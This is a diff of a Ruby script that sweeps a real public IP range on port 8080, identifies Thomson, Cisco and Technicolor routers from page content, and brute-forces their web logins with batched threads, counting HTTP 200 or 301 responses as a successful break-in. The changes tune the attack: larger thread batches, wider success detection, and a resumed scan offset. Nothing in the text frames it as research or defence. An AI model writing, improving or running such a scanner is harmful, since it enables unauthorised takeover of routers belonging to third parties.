@@ -23,14 +23,14 @@ class Rpw
 
 				end
 			end
-		rescue	Timeout::Error
+		rescue	Timeout::Error,Errno::ECONNREFUSED
 
 			return false
 
 		end
 	end
 	def detect(body_data)
-		routers = {:thomson => "Thomson", :cisco => "cisco ", :technicolor => "thecnicolor"}
+		routers = {:thomson => "Thomson", :cisco => "cisco ", :technicolor => "technicolor"}
 		body_data.each {|data,value| print data," = > ",value,"\n"}
 
 		routers.each do |data, re|
@@ -51,7 +51,7 @@ class Rpw
 			password.each  do |passwd|
 				threads << Thread.new{credential << login_request(user_name,passwd)}
 				
-				if(threads.size()%5 == 0 && threads.size() != 0)
+				if(threads.size()%8 == 0 && threads.size() != 0)
 					threads.each(&:join)
 					threads=[]
 				end
@@ -59,7 +59,7 @@ class Rpw
 		end
 		threads.each(&:join)
 		credential.each do |rta|
-			if rta[0].code == "200"
+			if rta[0].code == "200" || rta[0].code == "301"
 				print "ok"
 				return rta
 			end
@@ -75,9 +75,12 @@ class Rpw
 		res = Net::HTTP.start(uri.hostname, uri.port) {|http| http.request(req) }
 		return res,[user_name , passwd]
 	end
+	def ip
+		@ip
+	end
 end
  c=0
-for i in (0..255)
+for i in (103..255)
 	router = Rpw.new("190.158.217.#{i}",8080) 
 	if router.test_connection
 		print "#{c}) 190.158.217.#{i}: "
